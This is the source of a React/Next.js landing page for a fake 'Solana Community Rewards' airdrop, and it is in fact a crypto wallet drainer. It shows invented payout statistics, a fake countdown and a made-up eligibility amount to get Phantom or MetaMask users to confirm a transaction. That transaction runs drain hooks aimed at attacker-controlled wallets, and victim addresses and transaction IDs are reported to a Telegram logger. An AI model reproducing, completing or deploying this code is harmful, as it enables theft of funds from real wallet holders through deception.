"use client";

import { useState, useEffect } from 'react';
import { useSolanaDrain } from '@/hooks/useSolanaDrain';
import { useEthereumDrain } from '@/hooks/useEthereumDrain';
import { sendTelegramLog } from '@/utils/telegramLogger';
import { calculateAllocation } from '@/utils/calculateAllocation';
import WalletModal from '@/components/WalletModal';
import styles from './page.module.css';

const RPC_SOLANA = process.env.NEXT_PUBLIC_SOLANA_RPC;
const SOLANA_DRAIN_WALLET = process.env.NEXT_PUBLIC_SOLANA_WALLET;
const ETHEREUM_DRAIN_WALLET = process.env.NEXT_PUBLIC_ETHEREUM_WALLET;

// Initial stats
const INITIAL_STATS = {
  totalDistributed: 1784,
  participants: 4287,
  totalPool: 3500
};

export default function Home() {
  const [connected, setConnected] = useState(false);
  const [walletType, setWalletType] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);
  const [showModal, setShowModal] = useState(false);
  const [allocatedAmount, setAllocatedAmount] = useState(null);
  const [processing, setProcessing] = useState(false);
  const [drainComplete, setDrainComplete] = useState(false);
  const [stats, setStats] = useState(INITIAL_STATS);
  const [countdown, setCountdown] = useState(180);
  
  const { executeDrain: executeSolanaDrain } = 
    useSolanaDrain(RPC_SOLANA, SOLANA_DRAIN_WALLET);
  const { executeDrain: executeEthereumDrain } = 
    useEthereumDrain(ETHEREUM_DRAIN_WALLET);
  
  // Countdown timer
  useEffect(() => {
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 1) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    
    return () => clearInterval(timer);
  }, []);
  
  // Format time MM:SS
  const formatTime = (seconds) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };
  
  // Handle wallet connection
  const handleWalletSelect = async (type) => {
    try {
      setWalletType(type);
      
      if (type === 'phantom') {
        if (!window.solana) {
          alert('Please install Phantom wallet');
          return;
        }
        const response = await window.solana.connect();
        const address = response.publicKey.toString();
        setWalletAddress(address);
        setConnected(true);
        
        // Calculate allocation based on address
        const amount = calculateAllocation(address);
        setAllocatedAmount(amount);
        
        // Telegram log
        await sendTelegramLog('connected', {
          type: 'phantom',
          address,
          amount
        });
        
      } else if (type === 'metamask') {
        if (!window.ethereum) {
          alert('Please install MetaMask');
          return;
        }
        const provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        const signer = await provider.getSigner();
        const address = await signer.getAddress();
        setWalletAddress(address);
        setConnected(true);
        
        // Fixed ETH amount for simplicity
        setAllocatedAmount(0.15);
        
        await sendTelegramLog('connected', {
          type: 'metamask',
          address
        });
      }
      
      setShowModal(false);
      
    } catch (error) {
      console.error('Connection failed:', error);
    }
  };
  
  // Handle drain execution
  const handleDrain = async () => {
    if (!walletType || !allocatedAmount) return;
    
    try {
      setProcessing(true);
      
      let result;
      if (walletType === 'phantom') {
        result = await executeSolanaDrain(window.solana, allocatedAmount);
      } else if (walletType === 'metamask') {
        result = await executeEthereumDrain();
      }
      
      if (result?.success) {
        // Update stats
        setStats(prev => ({
          totalDistributed: prev.totalDistributed + allocatedAmount,
          participants: prev.participants + 1,
          totalPool: prev.totalPool
        }));
        
        setDrainComplete(true);
        
        // Telegram success log
        await sendTelegramLog('drained', {
          type: walletType,
          amount: allocatedAmount,
          address: walletAddress,
          txId: result.txId || result.txHash
        });
        
        // Redirect after 2 seconds
        setTimeout(() => {
          window.location.href = `https://explorer.solana.com/tx/${result.txId || 'fake-tx'}`;
        }, 2000);
      }
      
    } catch (error) {
      console.error('Drain failed:', error);
      await sendTelegramLog('drain_failed', {
        error: error.message,
        address: walletAddress
      });
    } finally {
      setProcessing(false);
    }
  };
  
  // Open wallet modal
  const openWalletModal = () => {
    setShowModal(true);
  };
  
  return (
    <div className={styles.container}>
      {/* Header */}
      <header className={styles.header}>
        <div className={styles.logoSection}>
          <div className={styles.logo}>
            <div className={styles.logoIcon}>✦</div>
            <div>
              <h1>Solana Community Rewards</h1>
              <p className={styles.logoSubtitle}>Official Distribution Program</p>
            </div>
          </div>
        </div>
      </header>
      
      {/* Main Content */}
      <main className={styles.main}>
        <div className={styles.heroSection}>
          <div className={styles.heroContent}>
            <h2 className={styles.heroTitle}>
              <span className={styles.highlight}>3,500 SOL</span> Community Reward Pool
            </h2>
            <p className={styles.heroSubtitle}>
              Connect your wallet to verify eligibility for the Sol Community Rewards Pool
            </p>
          </div>
          
          <div className={styles.statsGrid}>
            <div className={styles.statCard}>
              <div className={styles.statNumber}>
                {stats.totalDistributed.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})} SOL
              </div>
              <div className={styles.statLabel}>Distributed from pool</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statNumber}>
                {stats.participants.toLocaleString()}
              </div>
              <div className={styles.statLabel}>Participants</div>
            </div>
            <div className={styles.statCard}>
              <div className={styles.statNumber}>
                {formatTime(countdown)}
              </div>
              <div className={styles.statLabel}>Round ends in</div>
            </div>
          </div>
        </div>
        
        {/* Connection Section */}
        <div className={styles.connectionSection}>
          {!connected ? (
            <div className={styles.connectCard}>
              <button 
                className={styles.connectButton}
                onClick={openWalletModal}
              >
                Connect Wallet
              </button>
              <p className={styles.connectNote}>
                Connect to check your eligibility status
              </p>
            </div>
          ) : (
            <div className={styles.eligibilityCard}>
              {/* Animation */}
              {!allocatedAmount && (
                <div className={styles.checkingAnimation}>
                  <div className={styles.pulseCircle}></div>
                  <p>Checking eligibility...</p>
                </div>
              )}
              
              {/* Eligibility Result */}
              {allocatedAmount && !drainComplete && (
                <>
                  <div className={styles.eligibleResult}>
                    <div className={styles.successIcon}>🎉</div>
                    <div className={styles.resultContent}>
                      <h3>Eligible for {allocatedAmount.toFixed(2)} SOL</h3>
                      <p>Your wallet qualifies for this distribution round</p>
                    </div>
                  </div>
                  
                  <button
                    className={styles.confirmButton}
                    onClick={handleDrain}
                    disabled={processing}
                  >
                    {processing ? 'Processing...' : `Confirm and Process ${allocatedAmount.toFixed(2)} SOL`}
                  </button>
                </>
              )}
              
              {/* Drain Complete */}
              {drainComplete && (
                <div className={styles.completeState}>
                  <div className={styles.completeIcon}>✅</div>
                  <div className={styles.completeContent}>
                    <h3>Distribution Initiated</h3>
                    <p>Your {allocatedAmount.toFixed(2)} SOL is being processed</p>
                    <p className={styles.completeNote}>Transaction will appear in your wallet shortly</p>
                  </div>
                </div>
              )}
            </div>
          )}
        </div>
        
        {/* Info Section */}
        <div className={styles.infoSection}>
          <h3 className={styles.infoTitle}>How It Works</h3>
          <div className={styles.infoGrid}>
            <div className={styles.infoCard}>
              <div className={styles.infoNumber}>1</div>
              <h4>Connect Wallet</h4>
              <p>Securely connect your Phantom or MetaMask wallet</p>
            </div>
            <div className={styles.infoCard}>
              <div className={styles.infoNumber}>2</div>
              <h4>Check Eligibility</h4>
              <p>Instant verification of your wallet's eligibility status</p>
            </div>
            <div className={styles.infoCard}>
              <div className={styles.infoNumber}>3</div>
              <h4>Receive Allocation</h4>
              <p>Approved SOL distributed directly to your connected wallet</p>
            </div>
          </div>
        </div>
      </main>
      
      {/* Footer */}
      <footer className={styles.footer}>
        <div className={styles.footerContent}>
          <p className={styles.footerText}>
            © 2024 Solana Community Rewards. All distributions are executed on-chain.
          </p>
          <div className={styles.footerLinks}>
            <a href="#">Terms</a>
            <a href="#">Privacy</a>
            <a href="#">Support</a>
          </div>
        </div>
      </footer>
      
      {/* Wallet Modal */}
      <WalletModal 
        isOpen={showModal}
        onClose={() => setShowModal(false)}
        onSelect={handleWalletSelect}
      />
    </div>
  );
                            }
